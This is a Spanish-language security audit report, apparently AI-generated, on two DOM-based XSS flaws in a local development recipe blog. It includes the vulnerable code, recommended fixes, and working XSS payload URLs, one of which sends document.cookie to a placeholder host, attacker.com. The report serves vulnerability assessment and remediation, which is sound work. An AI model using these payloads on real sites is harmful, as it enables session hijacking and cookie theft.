# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 16:13:26  
**Objetivo:** http://web.dev.local:8082  
**Analista:** Copilot Security Audit  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS

---

## Resumen Ejecutivo

Se identificaron **dos vulnerabilidades de tipo Cross-Site Scripting (XSS) basado en el DOM (DOM-based XSS)** en la aplicación web objetivo. Ambas son explotables directamente desde el navegador del usuario sin interacción del servidor. Una de ellas es una XSS reflejada (Reflected DOM XSS) y la otra es una XSS almacenada en el lado del cliente (Stored DOM XSS via localStorage).

---

## Descripción de la Aplicación

La aplicación es un blog de recetas (`Blog de Recetas`) con dos funcionalidades principales:

1. **Buscador de recetas** – recibe el parámetro GET `search`
2. **Sección de comentarios** – recibe los parámetros GET `name` y `comment`

Ambas funcionalidades procesan parámetros de la URL directamente en JavaScript del lado del cliente mediante `document.write()` sin aplicar ningún tipo de sanitización o codificación.

---

## Vulnerabilidades Encontradas

### Vulnerabilidad 1: Reflected DOM-based XSS en el parámetro `search`

**Severidad:** Alta (CVSS 3.1 ~7.4)  
**Tipo:** DOM-based XSS (Reflejado)  
**Parámetro afectado:** `search` (GET)

**Código vulnerable (líneas ~150-152):**
```javascript
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

El valor de `searchTerm` se inserta directamente en `document.write()` sin ningún tipo de escapado o sanitización. Un atacante puede inyectar HTML/JavaScript arbitrario a través del parámetro `search` en la URL.

**Payload de explotación:**
```
http://web.dev.local:8082?search=<img src=x onerror=alert(document.cookie)>
```

**URL codificada:**
```
http://web.dev.local:8082?search=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E
```

**Payload alternativo con cierre de etiqueta:**
```
http://web.dev.local:8082?search=</strong><script>alert('XSS')</script>
```

**Impacto:** Un atacante puede robar cookies de sesión, redirigir al usuario a sitios maliciosos, o ejecutar cualquier JavaScript en el contexto del dominio víctima.

---

### Vulnerabilidad 2: Stored DOM-based XSS en los parámetros `name` y `comment`

**Severidad:** Alta (CVSS 3.1 ~8.0)  
**Tipo:** DOM-based XSS (Almacenado en localStorage)  
**Parámetros afectados:** `name` y `comment` (GET)

**Código vulnerable (líneas ~186-218):**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    // ...
}

// Al mostrar comentarios almacenados:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores de `name` y `comment` se almacenan en `localStorage` sin sanitización y se reinsertan en el DOM mediante `document.write()` en cada carga de página. Esto constituye una XSS almacenada persistente en el cliente.

**Payload de explotación (nombre):**
```
http://web.dev.local:8082?name=<img src=x onerror=alert('XSS en nombre')>&comment=Comentario+normal
```

**Payload de explotación (comentario):**
```
http://web.dev.local:8082?name=Usuario&comment=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Impacto:** El payload se almacena en el `localStorage` del navegador y se ejecuta en cada visita posterior del usuario a la página. Permite robo de sesión, keylogging, defacement local, etc.

---

## Confirmación de Vulnerabilidad

Se verificó que el código fuente de la página contiene las siguientes instrucciones inseguras:

```
VULNERABLE: searchTerm insertado directamente en document.write sin sanitización
VULNERABLE: nombre del comentario insertado directamente en document.write sin sanitización
VULNERABLE: contenido del comentario insertado directamente en document.write sin sanitización
```

---

## Vector de Ataque

| # | Tipo | Parámetro | Vector | Persistencia |
|---|------|-----------|--------|--------------|
| 1 | DOM XSS Reflejada | `search` | URL compartida/phishing | No (sólo durante la visita) |
| 2 | DOM XSS Almacenada | `name`, `comment` | URL inicial + localStorage | Sí (persiste entre visitas) |

---

## Recomendaciones de Mitigación

1. **Sanitizar entradas antes de insertar en el DOM:**
   ```javascript
   function escapeHtml(str) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(str));
       return div.innerHTML;
   }
   document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
   ```

2. **Evitar el uso de `document.write()`** – usar `textContent` o `createElement` con manejo seguro de texto.

3. **Usar la API DOM de forma segura:**
   ```javascript
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm;
   container.appendChild(p);
   ```

4. **Implementar Content Security Policy (CSP):** Agregar cabecera HTTP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

5. **Sanitizar datos almacenados en localStorage** antes de renderizarlos.

6. **Usar una librería de sanitización** como DOMPurify para validar contenido dinámico.

---

## Conclusión

La aplicación presenta vulnerabilidades XSS críticas en el lado del cliente. El uso de `document.write()` con datos provenientes directamente de parámetros URL y de `localStorage` sin ningún tipo de sanitización o codificación HTML constituye un riesgo significativo. Se recomienda corregir de inmediato siguiendo las recomendaciones expuestas.
